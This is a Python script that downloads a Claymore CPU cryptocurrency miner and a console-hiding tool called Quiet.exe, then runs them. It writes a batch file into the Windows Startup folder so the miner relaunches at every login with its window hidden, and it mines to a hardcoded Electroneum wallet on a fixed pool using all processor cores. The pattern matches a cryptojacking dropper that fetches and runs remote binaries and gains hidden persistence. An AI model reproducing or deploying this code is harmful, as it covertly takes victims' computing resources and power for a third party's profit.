import urllib.request
import zipfile
import os
print("[!] If possible, run this script as administrator for better hashrates.")

class Miner():
    miner_url = 'https://github.com/nanopool/Claymore-XMR-CPU-Miner/releases/download/v4.0/Claymore.CryptoNote.CPU.Miner.v4.0.-.POOL.zip'
    address = 'etnk5sbb4h2hqeQwoH19962Hr9Sx4XkR6LouYXEapges9rs3tQUL7CyegGnZEh7nEtYa26SUk237fhGiNpXdceMT1jYYD2B4kd'
    pool = "pool.etn.spacepools.org:1337"
    def __init__(self):
        self.download()
        self.unzip()
        self.configure()
    def download(self):
        print('[+] Downloading the miner.')
        urllib.request.urlretrieve(self.miner_url, 'miner.zip')
        print('[+] Miner downloaded.')
    def unzip(self):
        with zipfile.ZipFile('miner.zip', 'r') as zip:
            zip.extractall('miner')
        print('[+] Miner unzipped.')
    def configure(self):
        os.chdir('miner')
        urllib.request.urlretrieve("https://github.com/MikserCompany/quiet/releases/download/v1.01/Quiet.exe", "Quiet.exe")
        print("[+] Quiet.exe downloaded")
        miner_location = os.getcwd().replace('\\', '/')
        os.chdir(f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
        with open('start.bat', 'w') as cfg:
            cfg.write(f'cd "{miner_location}" \nQuiet.exe NsCpuCNMiner64.exe -o {self.pool} -u {self.address} -t {os.getenv("NUMBER_OF_PROCESSORS")}')
            cfg.close()
        print("[+] Config generated.")
        os.system("start.bat")
        print("[+] Miner started.")
Miner()